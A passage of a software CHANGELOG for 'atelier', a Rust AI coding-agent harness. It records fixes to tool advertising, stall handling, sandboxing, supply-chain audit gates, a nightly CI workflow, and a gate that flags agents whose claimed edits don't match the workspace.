3. Terse-execution etiquette ("do not ask the user for confirmation between steps").

The system message is injected at `messages[0]` on fresh runs only; resumed runs re-hydrate the original from the on-disk session prefix.

### Live verification — t01 actually green

| stage | turns | tool calls | final_state |
|-------|------:|----------:|:------------|
| pre-v60.15 (Track B bring-up) | 20 | 0 | Streaming (silent wedge) |
| v60.15 (stall guard) | 1 | 0 | AwaitingUser (stall surfaced) |
| v60.16 (tools advertised) | 20 | 11 | Streaming (model engaged, couldn't claim done) |
| v60.17 fix 1+2 (sandbox) | 18 | 11 | AwaitingUser (task done, no envelope) |
| **v60.17 fix 3+4 (envelope + system prompt)** | **<20** | **19** | **Done** ✓ |

Total live-API budget burned across the v60.15 → v60.17 investigation: ~$0.03 of Anthropic credit. The next live tests (t02, t05, t06, t10) are still gated and skipped by default; the green t01 path proves the harness contract end-to-end without needing live-API exercise of every fixture.

### Tests touched

- **NEW** unit: `first_external_destination_ignores_python_dash_c_dotted_identifiers` (`shell.rs`) — pins the §11 fix.
- **NEW** unit: `harness_meta_tool_spec_round_trips_a_real_envelope_through_its_schema` (`protocol_strategy.rs`) — pins the schema.
- **UPDATED**: `few_shot_override_prepends_adapter_messages_to_per_turn_history`, `few_shot_override_is_cached_across_turns_not_recomputed`, `swap_adapter_clears_few_shot_cache` — all shift expectations by one to accept the leading atelier system prompt at `messages[0]`.

Workspace test count **1043 → 1045** (atelier-core 795 → 797). `cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings`, `cargo test --workspace`, and the gated live `phase_a_live_anthropic_t01_add_pure_function` all green.

### Files touched

- `crates/atelier-core/src/sandbox.rs` — homebrew prefix grants.
- `crates/atelier-core/src/tools/shell.rs` — hostname-charset guard + regression test.
- `crates/atelier-core/src/protocol_strategy.rs` — `harness_meta_tool_spec()` + unit test.
- `crates/atelier-cli/src/runner.rs` — per-turn `turn_tools_spec`, `build_atelier_system_prompt(...)`, fresh-run injection at `messages[0]`.
- `crates/atelier-cli/tests/run_integration.rs` — three message-index shifts.

## v60.16 — 2026-05-18 (Tools are actually advertised to the provider; Track B unwedged end-to-end)

Fixes the bug v60.15's stall guard pointed at: the runner's `tools_spec` argument to every `adapter.chat()` call was always `Vec::new()` because the stub `registry_to_tool_specs()` returned `Vec::new()` with a v0 comment that nobody had revisited. With no tools on the wire, Claude (Haiku 4.5 + Sonnet 4.6) had nothing to invoke, every assistant turn was bare prose, the new stall guard tripped on turn 1, and Track B's live gate produced `final_state=AwaitingUser` instead of a real verification. The model wasn't broken; the harness was lying to it about what was available.

### Root cause

`crates/atelier-cli/src/runner.rs`'s `registry_to_tool_specs() -> Vec<ToolSpec>` returned an empty vector with the comment "Empty `&[ToolSpec]` for v0 — adapters that need the tool list for native tool-use mode get it from this. The real list (with each tool's `input_schema`) lands when the dispatcher's input-schema work expands." That dispatcher work landed (v60.13 Track A's `BuiltInToolWrapper` carries name/description/input_schema from the bundled manifest; the §15 `McpToolWrapper` carries the same from the MCP server's advertisement) but the runner never picked it up. The Anthropic adapter's `build_request_body` then guarded `if !tools.is_empty()` and silently omitted the `tools` field from the request, so Claude's tool-use channel was never primed.

### The fix

- **`crates/atelier-core/src/dispatcher.rs`** — `Tool` trait gains two new methods with permissive defaults: `fn description(&self) -> &str { "" }` and `fn input_schema(&self) -> Value { json!({ "type": "object" }) }`. The defaults preserve every existing bare `Tool` impl (test doubles, future MCP-routed tools that don't carry a schema). A new `ToolRegistry::tool_specs() -> Vec<ToolSpec>` walks the `BTreeMap` and projects each tool through these accessors — order matches `names()`, which `BTreeMap` keeps stable.
- **`crates/atelier-core/src/tools/builtin_wrapper.rs`** — `BuiltInToolWrapper`'s `impl Tool` overrides both: `description()` returns the manifest's `description`, `input_schema()` clones the manifest's `input_schema`. The wrapper already held both fields; we just wire them through the trait.
- **`crates/atelier-core/src/mcp/mcp_tool.rs`** — `McpToolWrapper` gets the symmetric overrides from its MCP-advertised manifest. Future MCP servers register tools via the same path; no per-server changes needed.
- **`crates/atelier-cli/src/runner.rs`** — `let tools_spec = registry.tool_specs();` *before* the registry is moved into `Dispatcher::new(...)`, then dropped through `adapter.chat(&messages, &tools_spec)` for every turn. The dead `registry_to_tool_specs()` stub is removed; the unused `ToolSpec` import is cleaned up.

### Verification

- **Unit:** new `registry_tool_specs_carries_name_description_schema_in_sorted_order` in `dispatcher.rs` — pins the trait-default contract (empty description, `{ "type": "object" }` schema) plus the `BTreeMap` ordering on three tools.
- **Workspace:** `cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings`, `cargo test --workspace` all green. atelier-core 794 → 795 (+1 new); total **1042 → 1043** across all crates.
- **Live (~$0.005 of Anthropic budget):** `phase_a_live_anthropic_t01_add_pure_function` against `anthropic:claude-haiku-4-5`. **Pre-fix:** 1 turn, 12 events, `final_state=AwaitingUser`, 0 tool calls. **Post-fix:** 20 turns, 130+ events, `final_state=Streaming`, **11 successful tool invocations** (8 × `shell`, 2 × `read_file`, 1 × `write_file`). The model is now actively engaging with the canonical task. The test still fails — but on a different axis: the model burns the turn cap trying to run pytest validation against a system Python the MacOS sandbox is blocking (`dyld[…]: Library not loaded: /opt/homebrew/Cellar/python@3.14/…`, "file system sandbox blocked open()"). The remaining work is a sandbox-policy / fixture-environment fix, not a wire-format fix — exactly the next-session work v60.15's CHANGELOG promised.

### Files touched

- `crates/atelier-core/src/dispatcher.rs` — `Tool` trait extension, `ToolRegistry::tool_specs()`, unit test, `ToolSpec` import.
- `crates/atelier-core/src/tools/builtin_wrapper.rs` — `description()` + `input_schema()` overrides on the wrapper.
- `crates/atelier-core/src/mcp/mcp_tool.rs` — same overrides on the MCP wrapper.
- `crates/atelier-cli/src/runner.rs` — snapshot `tools_spec` from the registry, drop the dead stub, prune the import.

## v60.15 — 2026-05-18 (§2 stall guard + state desync fix; Track B unblocked at the runner level)

Fixes a runner bug that surfaced during the Track B (live-API canonical gate) bring-up: when an assistant turn produced neither real tool calls nor `claimed_done=true`, the runner kept iterating the loop and re-calling the adapter with a conversation array ending on an assistant turn. The Anthropic API rejects that pattern with `400 invalid_request_error` on stricter models (Sonnet 4.6, Opus 4.7); permissive providers (Haiku 4.5) return ~3-token empty completions in a wedge until the turn cap. Both arms collapse to the same diagnosis — the agent has abandoned the §2 contract (every well-formed turn either advances state via tool calls or terminates via `claimed_done`) — and `runner.rs` now treats it that way.

Bug surfaced during an A/B probe of `phase_a_live_anthropic_t01_add_pure_function`: Haiku produced 21 turns × 3 completion tokens (looks like "weak model") while Sonnet 4.6 surfaced the same root cause as an explicit 400 ("This model does not support assistant message prefill. The conversation must end with a user message."). Pre-fix the offline mock tests never caught this because every mock script reliably emits tool calls + `claimed_done=true` on turn 0, so the loop exits before the stall pattern can manifest.

### Two layered fixes

- **Stall guard** (`runner.rs:1660+`). After per-turn telemetry and before the next iteration, check `made_tool_calls && envelope.claimed_done == Some(true)`. When both are absent, emit a new `Event::AgentStalled { turn, reason }`, advance `Streaming → AwaitingUser`, and break the loop. `final_state = AwaitingUser` is the spec's signal for "the user must intervene to make progress." Operators (TUI, GUI, `--non-interactive` driver) decide whether to nudge, swap adapter, or abort — there's nothing the loop alone can do to recover from a model that's stopped using tools.
- **State-desync fix** (`runner.rs:1222`). Pre-fix the top-of-iteration `advance(Idle → Streaming)` ran unconditionally, but after turn 0 the actor is already at `Streaming` (or oscillating `Streaming ↔ Tool*`). Every iteration past the first was emitting an `IllegalTransitionAttempted{Streaming, Streaming}` to the bus. Post-fix the advance is guarded by `if final_state == State::Idle`, so it fires exactly once per run. The spec §2.5 transition table has no `Streaming → Idle` edge — multi-turn iteration stays inside `Streaming` modulo the `Streaming ↔ Tool*` sub-cycle, which is what the actor's existing transitions already model.

### New event variant + driver projections

- `Event::AgentStalled { turn: usize, reason: String }` lives next to `StrategyDegraded` in `crates/atelier-core/src/session.rs` (both are §1/§2 model-behaviour signals, both transition state and announce on the bus). `turn` is 1-indexed so it matches `RunReport.turns`. `kind()` returns `"AgentStalled"`.
- GUI bridge (`crates/atelier-gui/src/lib.rs`) projects `{ turn, reason }` for the Svelte toast surface.
- TUI (`crates/atelier-tui/src/lib.rs`) renders `"turn N: <reason>"` in the event log and folds the state transition into the existing badge path (the paired `Transitioned { Streaming → AwaitingUser }` updates the state pill).

### Tests — 2 new regressions + 3 updated to the new contract

- **NEW** `run_stalls_cleanly_when_assistant_turn_has_no_tools_and_no_claimed_done` — single-turn stall scenario. Pins `final_state == AwaitingUser`, `turns == 1` (not the full `max_turns=10` budget), exactly one `Event::AgentStalled` emitted with a non-empty `reason`, zero `Event::IllegalTransitionAttempted`, and the `Streaming → AwaitingUser` transition itself on the bus.
- **NEW** `run_stalls_on_second_turn_without_replaying_idle_to_streaming` — pins Bug B specifically. Turn 0 makes a benign `list_dir` call (loop continues into turn 1); turn 1 stalls. Asserts `turns == 2`, zero `IllegalTransitionAttempted{Streaming, Streaming}`, and `Idle → Streaming` firing exactly once across the whole run.
- **UPDATED** `run_bails_after_max_turns_without_claimed_done` — pre-fix the test was asserting the wedge behaviour. Post-fix the responses include benign `list_dir` calls so the loop iterates without stalling and hits `max_turns=2` naturally; the contract pinned is now the max-turns boundary alone (`final_state != Done && final_state != AwaitingUser` — the latter assertion specifically guards against the test silently degenerating into a stall-guard test).
- **UPDATED** `run_degrades_strategy_after_three_malformed_envelopes_in_window` — each malformed turn now also makes a `list_dir` call so the stall guard doesn't fire before the conformance buffer can accumulate three failures. The conformance buffer's `record_failure` predicate is "envelope parse failed", independent of tool-call presence; the test exercises that distinction directly now.
- **UPDATED** `few_shot_override_is_cached_across_turns_not_recomputed` — `MockAdapterWithOverride::queue_text_only` renamed to `queue_continuing_turn` and now queues a `list_dir` tool call alongside the text. The method's role was always "queue a turn that doesn't terminate the loop"; the rename makes that intent explicit.

### Live A/B probe — what we learned and what's still broken

The bug was found by burning ~$0.012 of Anthropic API budget across two t01 probes (one Haiku pre-fix, one Sonnet pre-fix, one Haiku post-fix). The post-fix Haiku probe terminates after **1** turn / 12 events / 8.65s — vs the pre-fix **20** turns / 124 events / 22.78s — and the panic message tells the operator "agent stalled on turn 1 (final_state=AwaitingUser). The model produced an assistant turn with neither tool calls nor claimed_done=true." That's the unblocking signal Track B's `EventSink::Capture` instrumentation (also in this revision) was always going to need.

**Track B is unblocked at the runner level but not yet green.** The live B1 tests still fail because `anthropic:claude-haiku-4-5` (and Sonnet 4.6, which we A/B'd to confirm) isn't invoking tools for atelier's canonical workload prompt. The stall guard surfaces that cleanly instead of wedging silently, but doesn't make the model use tools. Next session's work: inspect the adapter's request payload (`RUST_LOG=atelier_core::adapter::anthropic=trace`), compare atelier's system prompt + tool-spec wire format against a known-working tool-use harness, and decide whether the fix is at the prompt layer, the tool-spec serialisation layer, or both. Workspace tests **1040 → 1042** (+2 stall regressions; the three updated tests didn't change the count).

### Files touched

- `crates/atelier-core/src/session.rs` — `Event::AgentStalled` variant + `kind()` arm.
- `crates/atelier-cli/src/runner.rs` — conditional `Idle → Streaming` advance, captured `made_tool_calls`, stall guard at end-of-turn.
- `crates/atelier-gui/src/lib.rs` — `bridge_event` arm for the new variant.
- `crates/atelier-tui/src/lib.rs` — `AppState` log arm + event-log formatter arm.
- `crates/atelier-cli/tests/run_integration.rs` — 2 new stall tests, 3 updated tests, `queue_continuing_turn` rename + body, `drive_live_canonical_task` stall-vs-turn-cap diagnostic split.

`cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings`, `cargo test --workspace` (1042 tests across all crates), and `make quality-cheap` all green post-change.

## v60.14 — 2026-05-18 (Supply-chain + dead-dep gate via `make quality-cheap`)

Adds a cheap, offline supply-chain hygiene gate. `make quality-cheap` runs `cargo-audit` against `Cargo.lock` and `cargo-machete` against `crates/`. Wired into `.github/workflows/check.yml` as a third job alongside `rust` and `rig` so a fresh advisory or a forgotten dep fails a PR. Caught and removed three genuinely unused workspace deps in `atelier-gui` (`tokio`, `tokio-stream`, `parking_lot`) plus `tokio-stream` in `atelier-tui` — Tauri provides the async runtime, and the `parking_lot` line carried a misleading "DispatcherHandle Mutex" comment despite zero symbol uses. Total: 4 deps dropped, 0 source-code changes required (the deletions are pure Cargo.toml work that the compiler confirms is sound via `cargo clippy --workspace --all-targets`).

### Advisory triage

One vulnerability + 20 warnings surfaced on first run; all are tauri/ratatui transitives. Triaged:

- **RUSTSEC-2026-0009** — `time 0.3.41` DoS via stack exhaustion (medium, 6.8). Suppressed via `--ignore RUSTSEC-2026-0009` in the Makefile gate. Rationale (also captured at the gate): the fix lives in `time >= 0.3.47`, which requires rustc 1.88; the workspace is pinned to rustc 1.85 via `rust-toolchain.toml`. Affected versions reach us only through Tauri transitives (`cookie`, `plist`, `serde_with`); atelier-gui renders trusted local UI exclusively, no untrusted-time-input path exists in atelier code. Remove the ignore when the toolchain pin moves to ≥ 1.88 (likely required for a future Tauri 2.x bump regardless).
- **20 warnings** — gtk-rs GTK3 unmaintained (10×, Linux-only via Tauri → wry), `lru 0.12.5` unsound (via ratatui), `glib 0.18.5` unsound (Linux Tauri), `instant`/`paste`/`proc-macro-error`/`unic-*` unmaintained. Warnings are non-fatal in `cargo-audit` by default; left as informational. A Tauri major bump is the natural cleanup point for the gtk-rs cluster.

### Tool-install gotcha: rustc 1.85 pin

Both tools' latest releases require rustc ≥ 1.86. Workarounds:

- `cargo-audit`: `cargo install --locked cargo-audit` (the locked deps stay compatible with rustc 1.85).
- `cargo-machete`: pinned to `0.7.0` — newer releases pull `cargo-platform 0.3.2` which needs rustc 1.88. The Makefile's install hint and the CI step both record this pin.

CI uses `taiki-e/install-action@v2` with `tool: cargo-audit,cargo-machete@0.7.0` so the runner downloads pre-built binaries from each tool's GitHub releases rather than recompiling against the pinned toolchain — keeps the new job under 30 s wall-clock.

### Why a separate CI job, not a step inside `rust`

The audit + machete gates read `Cargo.lock` / `Cargo.toml` only — no toolchain build, no Tauri Linux system deps. Folding them into the `rust` job would chain them behind clippy's full workspace compile (~minutes on cold cache) for no reason. The new `quality` job runs on `ubuntu-latest` only because its outputs are platform-independent: the RustSec advisory DB doesn't differ by host, and `cargo machete` walks `Cargo.toml` not `target/`.

### Files touched

- `Makefile` — new `quality-cheap` target + `.PHONY` entry; rationale for the `RUSTSEC-2026-0009` ignore lives at the gate so a future contributor can decide whether to remove it.
- `.github/workflows/check.yml` — new `quality` job (~25 lines).
- `crates/atelier-gui/Cargo.toml` — drop `tokio`, `tokio-stream`, `parking_lot`.
- `crates/atelier-tui/Cargo.toml` — drop `tokio-stream`.

`cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings`, `cargo test -p atelier-core` (794 tests), `cargo test -p atelier-cli` and `make quality-cheap` all green post-change.

## v60.13 — 2026-05-18 (Track A: §15 built-ins-as-MCP surface-symmetry refactor + Track C: Phase A nightly gate workflow)

Closes Tracks A and C from the Phase A close-out plan. A sibling `BuiltInToolWrapper` mirrors `McpToolWrapper`'s exact shape so the two registration paths converge at the dispatcher boundary (Track A). A new `.github/workflows/nightly_phase_a_gate.yml` runs the mechanical Phase A gates every night, records pass/fail to `tests/phase_a_gate/last_run.json` per a new `schemas/ci/phase_a_gate.v1.json`, commits the artifact back, and surfaces a one-line digest via the new `phase_a_gate_status` binary (Track C). Workspace tests **1020 → 1038** (+18; +11 wrapper/register from A, +7 status binary from C).

### Track C — Phase A nightly gate workflow

The nightly fires at 06:30 UTC (30 minutes after `nightly_protocol_overhead.yml` so the two `git push origin HEAD:main` calls don't race) and walks five gates with `continue-on-error: true` so one failure doesn't short-circuit the rest:

1. **`fmt`** — `cargo fmt --all -- --check`
2. **`clippy`** — `cargo clippy --workspace --all-targets -- -D warnings`
3. **`cargo_test_workspace`** — `cargo test --workspace`
4. **`rig_check`** — `make check` (schema meta-validation + artifact validation + 112 rig tests + 13 canonical workloads)
5. **`mcp_integration_npx`** — `cargo test -p atelier-cli --test mcp_integration -- --include-ignored` (the npx-gated MCP integration suite). **Informational, not red** — npm-registry flakiness shouldn't flip Phase A; the digest surfaces a failure but `all_passed` stays true.

Each step captures its exit code + wall-clock duration into a step output; a final `compose` step assembles `tests/phase_a_gate/last_run.json` against the schema, validates the fresh artifact via `tests/validate_artifacts.py`, commits + pushes to `main`, and uploads the `phase_a_gate_status` binary's one-line digest into the run's `GITHUB_STEP_SUMMARY`. A red gate also surfaces as a `::error::` annotation on the workflow run so it's visible on the actions tab without drilling into per-step logs.

### `schemas/ci/phase_a_gate.v1.json`

New schema family (`schemas/ci/` directory is new — sits alongside `schemas/protocol/` and `schemas/audit/`). Required fields: `version`, `run_id` (RFC 3339), `git_sha` (7-40 hex), `all_passed` (boolean — separately stored from the gate array so a reader can short-circuit), `gates: array of {name, status, ?duration_secs, ?details}`. `status` is one of `passed | failed | skipped`. `name` must be `^[a-z][a-z0-9_]*$` so a future analytics tooling can rely on the snake_case shape. `details` capped at 1 KiB so a malformed gate can't bloat the artifact.

Wired into `tests/validate_artifacts.py`'s `JSON_RULES` table so every PR's `make check` validates the file against the schema — a schema break is caught synchronously, not only on the next nightly firing.

### `crates/atelier-cli/src/bin/phase_a_gate_status.rs` (new binary)

Single-purpose reader, ~250 lines including tests:

- Accepts an optional positional path argument; defaults to `tests/phase_a_gate/last_run.json` resolved relative to `CARGO_MANIFEST_DIR` at build time.
- Prints two lines: a per-gate digest (`<run_id> <git_sha> <name>:<status> …`) plus a `Phase A: GREEN | RED  (N gates: P passed, F failed, S skipped)` digest.
- Exit codes: **0** = green, **1** = red (≥1 `failed`), **2** = artifact missing / malformed / unsupported version.
- A `failed` gate's `details` field is surfaced on stderr so a CI summary picks it up without parsing the JSON.
- 7 new unit tests via `tempfile`: `green_run_exits_zero`, `red_run_exits_one`, `missing_file_exits_two`, `malformed_json_exits_two`, `unsupported_version_exits_two`, `tally_counts_each_status`, `bundled_seed_artifact_parses` (drift gate against the in-tree seed).

Why a separate binary rather than an `atelier <subcommand>`: the nightly runs it with no harness state in scope (no session, no adapter); building a full `atelier` invocation for what is a 30-line JSON read would be wasteful. Cargo auto-discovers `src/bin/*.rs` so no `Cargo.toml` change is needed.

### Seed `tests/phase_a_gate/last_run.json`

One row per gate at `passed` status (with the `mcp_integration_npx` row marked `skipped` because the seed predates the first nightly firing). Subsequent nightly runs overwrite this file in place; the seed is committed so the workflow has something to validate against on its first run and so the `phase_a_gate_status` binary doesn't 404 in a fresh clone.

### Track A — surface symmetry — same shape as `McpToolWrapper`

### Surface symmetry — same shape as `McpToolWrapper`

The spec §15 invariant ("built-in tools and MCP-routed tools share the same `ToolDispatching → ToolExecuting` state transitions; the loop does not branch on tool origin") was already runtime-true at v60.11 — both registration paths hand the dispatcher an `Arc<dyn Tool>`. What v60.13 adds is **construction-time symmetry**: the bundled `tool_manifest.v1.json` files at `crates/atelier-core/tools/*.v1.json` are now the source of truth for `name`, `description`, `side_effect_class` and `input_schema` for built-ins, exactly as the server-advertised `tools/list` payload is for MCP-routed tools.

New module `crates/atelier-core/src/tools/builtin_wrapper.rs` (~340 lines including tests):

- `BuiltInToolWrapper` struct: holds `name`, `description`, `side_effect_class`, `input_schema: Value`, compiled `Arc<jsonschema::Validator>`, and `inner: Arc<dyn Tool>`. `impl Tool` delegates `execute` to the inner; `validate_args` runs the manifest's JSONSchema validator first (catches patterns / ranges / `oneOf` / `additionalProperties:false` that serde can't always express) THEN delegates to the inner.
- `BuiltInToolWrapper::from_manifest_json(manifest_json: &str, inner: Arc<dyn Tool>) -> Result<Self, BuiltInWrapError>` — parses the manifest, compiles the schema, asserts `parsed.name == inner.name()` and fails as `BuiltInWrapError::NameMismatch` otherwise so manifest/impl drift is a startup failure, not a silent dispatch error.
- `BuiltInWrapError` enum: `ManifestParse(String)`, `SchemaCompile(String)`, `NameMismatch { manifest, inner }`.
- The wrapper reuses `crate::mcp::mcp_tool::{compile_input_schema, validate_args_against}` so a future revision of the JSONSchema compilation path touches both wrappers in one place.

### `register_builtins` — `register_mcp_servers` sibling

`crates/atelier-core/src/tools/mod.rs::register_builtins(registry: &mut ToolRegistry) -> Result<RegisterBuiltinsReport, RegisterBuiltinsError>` walks a static 7-row `builtin_table()` (each row: name + `include_str!`-loaded manifest JSON + `Arc<dyn Tool>` inner), builds a wrapper per row via `BuiltInToolWrapper::from_manifest_json`, and registers each into the registry. Returns `RegisterBuiltinsReport { tools_registered: Vec<String> }` so the runner can ledger the registration alongside MCP-server registrations in one report shape.

`spawn_subagent.v1.json` exists in the manifest set but its Rust `Tool` impl hasn't landed (§10 delegation work) — the table leaves it out until the impl arrives; the manifest's existence is a forward-looking surface contract.

The runner's `crates/atelier-cli/src/runner.rs::built_in_registry()` is now a 4-line delegation to `register_builtins`. Direct imports of the seven tool structs from the runner go away; the `Tool` import becomes unused and is dropped from the use-list.

### Tests — 11 new

- `builtin_wrapper::tests` (8) — `name_comes_from_manifest_not_inner`, `side_effect_class_comes_from_manifest_not_inner`, `name_mismatch_rejected`, `malformed_manifest_rejected`, `invalid_schema_rejected`, `validate_args_runs_manifest_schema`, `execute_delegates_to_inner`, `all_bundled_manifests_parse` (drift gate: every one of the 7 bundled manifests parses + its schema compiles).
- `tools::register_tests` (3) — `register_builtins_registers_all_seven_with_correct_metadata` (asserts the registration order matches the table + spot-checks `read_file: LocalSafe`, `write_file: LocalRisky`, `shell: LocalRisky`), `register_builtins_is_idempotent_only_once` (a second call surfaces as `RegisterBuiltinsError::Register` rather than silently overwriting), `wrapper_rejects_unknown_field_via_manifest_schema` (the JSONSchema gate rejects `additionalProperties:false` violations ahead of the inner impl).

The seven inner `Tool` impls (`ReadFile`, `WriteFile`, `EditFile`, `ListDir`, `Grep`, `AstGrep`, `Shell`) and their ~30 existing unit tests are untouched — the refactor is purely additive at the inner layer. The 794 atelier-core tests + 72 atelier-cli tests + 94 atelier-gui tests + the TUI suite all stay green; `make check` runs all 112 rig tests + 13 canonical workloads + 57 artifacts.

### Why not literal in-process MCP for the built-ins

A literal in-process MCP transport for the built-ins (so they'd share `McpToolWrapper` not just its shape) was considered and rejected:

1. rmcp 0.1.5 has no in-process transport — only stdio + SSE. Wrapping each built-in in a `tokio::process::Command` spawn just to round-trip through rmcp's JSON-RPC framing is pure overhead.
2. Three built-ins (`write_file`, `edit_file`, `shell`) carry handles to in-process state — `Staging` (TempDir-owning), `SandboxPolicy`, the audit-log path — that don't cross an MCP boundary cleanly. The MCP server's view of the workspace would need to either rebuild these or take them by side-channel, neither of which is in scope.
3. No current consumer wants atelier embedded as a sub-process for another harness. If/when that lands, the v60.13 wrapper symmetry is the right shape to start from.

The wrapper symmetry buys the spec §15 promise (uniform dispatch shape) without paying for the speculative IPC layer.

## v60.12 — 2026-05-18 (Phase A close: canonical priority subset offline gates + §7 lying-agent E2E)

Phase A's "atelier-core drives canonical priority subset end-to-end via the §2.5 loop" line lands offline against `ProviderChoice::Mock`, and the §7 lying-agent gate (`tasks/todo.md:228`) closes after a real fix in `dispatcher::verify_pass`. Live-API gates (against Anthropic + OpenAI-compat) and the nightly workflow remain for follow-up Track B + Track C. Workspace tests **1018 → 1020** (+1 paired dispatcher unit test for the new branch, +6 new integration tests in atelier-cli, –5 reused slots = +2 net at the suite-level summary).

### A1 — canonical fixture loader

New test-helper module under `crates/atelier-cli/tests/common/` — first Rust consumer of `tests/workload/canonical/`.

- `tests/common/mod.rs` (8 lines) — declares `pub mod canonical` with `#![allow(dead_code)]` so per-integration-test-file unused-warning noise stays quiet.
- `tests/common/canonical.rs` (~270 lines) — `CanonicalTask::load("t01_…")` reads `meta.json` + `prompt.md` + `checks.json`; resolves the workspace path via `CARGO_MANIFEST_DIR`. Helpers: `copy_fixture_to_tempdir`, `run_checks`, `assert_all_checks_pass`, `python3_pytest_available`. Supports `command` + `exit_code(_ne)` + `stdout/stderr_contains` + `file_unchanged` (the primitives the priority subset uses); `stdout_pattern`/`stderr_pattern` surface as a failing `CheckResult` rather than passing silently (no priority canonical task depends on them today).
- `run_checks` removes `<workspace>/.atelier/` before running shell-based checks — the Runner writes `.atelier/sessions/<sid>/session.json` (containing the prompt verbatim) during a real run, which trips `grep -r` checks like t02's "no occurrence of `compute_total` remains." The Python rig dodges this with `--dry-run`; the Rust runner is hermetic so it removes the bookkeeping directly. No canonical fixture's expected state includes `.atelier/`, so the cleanup is sound.

### A2 — t01 mock-scripted canonical gate

`mock_drives_t01_canonical_priority_subset_offline_phase_a_gate` in `crates/atelier-cli/tests/run_integration.rs`. Loads `t01_add_pure_function`, scripts one `MockResponse` that writes `utils.py` (the `divisible_by` impl) + `tests/test_utils.py` (four tests) + `mock_envelope_tool_call(envelope_done_claiming_edits(&["utils.py", "tests/test_utils.py"]))`, drives the Runner, asserts `final_state == Done`, asserts `Event::VerificationPassed { tier: Tier3Textual, file_count: 2, .. }` fires, runs all 5 t01 canonical checks (pytest exit 0 + the four `divisible_by(…)` per-call assertions).

Skips cleanly when `python3 -m pytest` is unavailable via the new `python3_pytest_available()` probe (mirrors `mcp_integration.rs::npx_availability_probe`).

### A3 — t02, t05, t06, t10 mock-scripted canonical gates

Four more priority canonical tasks, same shape as A2:

- **t02 `rename_symbol_multi_file`** — nine `write_file` calls in one turn renaming `compute_total` → `compute_grand_total` across `README.md` + 5 `orders/` modules + 3 `tests/` modules. The check `grep -r compute_total` must return non-zero (no match); pytest must still pass.
- **t05 `fix_bug_from_failing_test`** — patches `format_duration` to handle the `minutes == 0` case (returning `"2h"` not `"2h0m"`). The check `file_unchanged: tests/test_duration.py` mechanically verifies the agent didn't modify the spec.
- **t06 `add_cli_flag`** — adds `--verbose` to `mycli.py` + new tests in `tests/test_mycli.py`. Both existing-test-passes and new-flag-works are asserted.
- **t10 `implement_from_spec`** — implements `LRUCache` (OrderedDict-backed, O(1)) against the seven-test spec in `tests/test_lru.py` (which is `file_unchanged`-pinned).

New helper `envelope_done_claiming_edits(&[paths])` mints an honest envelope whose `claimed_changes` cover every modified path as `ClaimedChangeKind::Edit` — the §7 gate's `verify::compare` treats Edit-vs-Modified as agreement, so the loop reaches `VerificationPassed` (rather than `VerificationFailed` for a silent edit, which the lying-agent gate covers separately).

### A4 — §7 lying-agent E2E gate (closes `tasks/todo.md:228`)

Real fix to a latent bug: `dispatcher::verify_pass` previously emitted `Event::VerificationPassed` *regardless* of whether `crate::verify::compare` returned discrepancies — the §7 detector logic existed but its signal never reached the bus. v60.12 wires it.

**Producer-side change** (`crates/atelier-core/src/dispatcher.rs`):

```rust
if run.discrepancies.is_empty() {
    let _ = self.events.send(Event::VerificationPassed { tier, file_count, claim_count });
} else {
    let _ = self.events.send(Event::VerificationFailed { tier, discrepancies: run.discrepancies.clone() });
}
```

**New event variant** (`crates/atelier-core/src/session.rs`): `Event::VerificationFailed { tier, discrepancies: Vec<Discrepancy> }`. The `kind()` arm returns `"VerificationFailed"`.

**Consumer arms**:

- **TUI** (`crates/atelier-tui/src/lib.rs`) — `apply` refreshes `verification_status` with the new tier (so the badge knows verify ran); `project_event` builds a one-line summary `"tier-3 (textual) · 2 discrepancies · a.txt: claimed edit but workspace diff is empty"` for the event log. The red-failed badge variant lands in Phase C.
- **GUI bridge** (`crates/atelier-gui/src/lib.rs::bridge_event`) — emits a `{"tier": …, "discrepancy_count": N, "discrepancies": [{"kind": "claimed" | "unclaimed" | "kind_mismatch" | "duplicate_claim", "path": …, …}]}` JSON payload to the Svelte side. Wire shape is stable; the GUI badge update lands in Phase C.
- **`ObservedKind::wire_label`** is now public (previously `as_str` was private), mirroring `VerificationTier::wire_label` and `ClaimedChangeKind::wire_label`, so cross-crate consumers don't need to re-encode the enum.

**End-to-end gate** (`crates/atelier-cli/tests/run_integration.rs`): `mock_lying_agent_fixture_flagged_within_one_turn_phase_a_seven_gate` scripts an envelope claiming `a.txt` while the actual tool call writes `b.txt`. Asserts within one turn: `Event::VerificationFailed { tier: Tier3Textual, discrepancies }` fires, `VerificationPassed` does NOT fire, `discrepancies` carries both `Discrepancy::Claimed { a.txt }` and `Discrepancy::Unclaimed { b.txt }`. Reaches `State::Done` — the §7 gate surfaces the signal but doesn't abort the run (trust budget consumes the discrepancy list downstream).

**Paired unit tests** (`crates/atelier-core/src/dispatcher.rs::tests`) — `verify_pass_emits_failed_event_when_discrepancies_present` + `verify_pass_emits_passed_event_when_workspace_agrees`. Pin both arms of the new branch; replace the previous (buggy) `verify_pass_emits_tier3_event_with_counts` which expected `VerificationPassed` for a discrepancy case.

### A5 — doc updates

- `tasks/todo.md`:228 flipped `[~]` → `[x]` (§7 lying-agent gate closed offline).
- `tasks/todo.md`:151 / 162 / 174 flipped `[ ]` → `[~]` with offline-landed notes and pointers to the remaining live-API + nightly-CI portions in Track B / C.

### What's *not* in v60.12

Live-API tests against Anthropic + OpenAI-compat (Track B) and the new nightly workflow (Track C `.github/workflows/nightly_phase_a_gate.yml`) are deferred. They need an `ANTHROPIC_API_KEY` secret + maintainer approval for the first run cost. The plan at `/Users/chris.adkin/.claude/plans/fluffy-painting-llama.md` documents them.

The §2 real-model conformance ≥95% gate (`tasks/todo.md:219`) is Phase B work; lands with Track B.

The §7 hallucinating-agent Tier-1 detector (`tasks/todo.md:225, 229`) stays gated on Q3 (LSP auto-install UX). Spec line 132 does not include it under Phase A.

---

## v60.11 — 2026-05-18 (three-bundle parallel release: §15 wave 2 + polish + B2 recovery)

